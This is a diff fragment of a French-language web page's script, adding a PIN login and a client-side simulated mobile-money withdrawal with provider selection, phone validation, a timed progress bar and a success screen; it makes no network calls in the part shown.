+      pinCard.classList.remove('shake');
+      void pinCard.offsetWidth;
+      pinCard.classList.add('shake');
+      pinInput.value = '';
+      pinInput.focus();
+    }
+  });
+
+  document.getElementById('logoutBtn').addEventListener('click', () => {
+    resetToPinScreen();
+  });
+
+  function resetToPinScreen(){
+    document.getElementById('detailScreen').classList.add('hidden');
+    document.getElementById('pinScreen').classList.remove('hidden');
+    pinInput.value = '';
+    pinError.textContent = '';
+    resetWithdrawSelection();
+  }
+
+  // ---------- Moyens de paiement ----------
+  const methods = [
+    { id: 'mtn',    label: 'MTN',    color: '#FFCC08', text: '#1B1B2F' },
+    { id: 'moov',   label: 'Moov',   color: '#0072CE', text: '#FFFFFF' },
+    { id: 'celtis',   label: 'Celtis',   color: '#00A651', text: '#FFFFFF' },
+    { id: 'orange', label: 'Orange', color: '#FF7900', text: '#FFFFFF' },
+    { id: 'airtel', label: 'Airtel', color: '#E4002B', text: '#FFFFFF' },
+    { id: 'wave',   label: 'Wave',   color: '#1DC8F2', text: '#0B2E45' }
+  ];
+
+  let selectedMethod = null;
+  const methodsGrid = document.getElementById('methodsGrid');
+
+  methods.forEach(m => {
+    const card = document.createElement('button');
+    card.type = 'button';
+    card.className = 'method-card';
+    card.dataset.id = m.id;
+    card.innerHTML = `
+      <div class="method-logo" style="background:${m.color}; color:${m.text}">${m.label.substring(0,2).toUpperCase()}</div>
+      <span>${m.label}</span>
+    `;
+    card.addEventListener('click', () => selectMethod(m, card));
+    methodsGrid.appendChild(card);
+  });
+
+  const summaryPanel = document.getElementById('summaryPanel');
+  const withdrawBtn = document.getElementById('withdrawBtn');
+  const phoneInput = document.getElementById('phoneInput');
+  const countryCode = document.getElementById('countryCode');
+  const phoneError = document.getElementById('phoneError');
+  const summaryPhone = document.getElementById('summaryPhone');
+  const phoneMethodLabel = document.getElementById('phoneMethodLabel');
+
+  function isPhoneValid(){
+    const digits = phoneInput.value.replace(/\D/g, '');
+    return digits.length >= 8;
+  }
+
+  function refreshWithdrawButton(){
+    const phoneOk = isPhoneValid();
+    withdrawBtn.disabled = !(selectedMethod && phoneOk);
+
+    if(!selectedMethod){
+      withdrawBtn.innerHTML = withdrawBtnIcon() + 'Sélectionnez un moyen de paiement';
+    } else if(!phoneOk){
+      withdrawBtn.innerHTML = withdrawBtnIcon() + 'Renseignez votre numéro';
+    } else {
+      withdrawBtn.innerHTML = withdrawBtnIcon() + `Retirer vers ${selectedMethod.label}`;
+    }
+  }
+
+  function withdrawBtnIcon(){
+    return `<svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+  }
+
+  phoneInput.addEventListener('input', () => {
+    phoneInput.value = phoneInput.value.replace(/[^\d\s]/g, '');
+    phoneError.textContent = '';
+    summaryPhone.textContent = phoneInput.value.trim() ? (countryCode.value + ' ' + phoneInput.value.trim()) : '-';
+    refreshWithdrawButton();
+  });
+
+  countryCode.addEventListener('change', () => {
+    summaryPhone.textContent = phoneInput.value.trim() ? (countryCode.value + ' ' + phoneInput.value.trim()) : '-';
+  });
+
+  phoneInput.addEventListener('blur', () => {
+    if(phoneInput.value && !isPhoneValid()){
+      phoneError.textContent = 'Numéro invalide (8 chiffres minimum).';
+    }
+  });
+
+  function selectMethod(method, cardEl){
+    selectedMethod = method;
+    document.querySelectorAll('.method-card').forEach(c => c.classList.remove('selected'));
+    cardEl.classList.add('selected');
+
+    document.getElementById('summaryMethod').textContent = method.label;
+    phoneMethodLabel.textContent = method.label;
+    summaryPanel.classList.add('show');
+
+    refreshWithdrawButton();
+    phoneInput.focus();
+  }
+
+  function resetWithdrawSelection(){
+    selectedMethod = null;
+    document.querySelectorAll('.method-card').forEach(c => c.classList.remove('selected'));
+    summaryPanel.classList.remove('show');
+    phoneInput.value = '';
+    phoneError.textContent = '';
+    summaryPhone.textContent = '-';
+    phoneMethodLabel.textContent = '-';
+    refreshWithdrawButton();
+  }
+
+  // ---------- Simulation du retrait ----------
+  const progressModal = document.getElementById('progressModal');
+  const progressFill = document.getElementById('progressFill');
+  const progressPercent = document.getElementById('progressPercent');
+  const successModal = document.getElementById('successModal');
+
+  withdrawBtn.addEventListener('click', () => {
+    if(!selectedMethod || !isPhoneValid()){
+      if(!isPhoneValid()) phoneError.textContent = 'Numéro invalide (8 chiffres minimum).';
+      return;
+    }
+    progressFill.style.width = '0%';
+    progressPercent.textContent = '0';
+    progressModal.classList.remove('hidden');
+
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 1; // 1% chaque seconde -> 100s pour remplir la barre
+      if(progress >= 100){
+        progress = 100;
+        clearInterval(interval);
+        progressFill.style.width = '100%';
+        progressPercent.textContent = '100';
+        setTimeout(() => {
+          progressModal.classList.add('hidden');
+          showSuccess();
+        }, 500);
+      } else {
+        progressFill.style.width = progress + '%';
+        progressPercent.textContent = progress;
+      }
+    }, 1000);
+  });
+
+  function showSuccess(){
+    document.getElementById('successAmount').textContent = fmtMontant(participant.solde) + ' FCFA';
+    document.getElementById('successMethod').textContent = selectedMethod.label;
+    document.getElementById('successPhone').textContent = countryCode.value + ' ' + phoneInput.value.trim();
+    successModal.classList.remove('hidden');
+  }
+
+  document.getElementById('homeBtn').addEventListener('click', () => {
+    successModal.classList.add('hidden');
+    resetToPinScreen();
+  });
+
+  // ---------- Initialisation ----------
+  populateParticipant();
+  loadParticipant();
+})();
+</script>
+</body>
+</html>
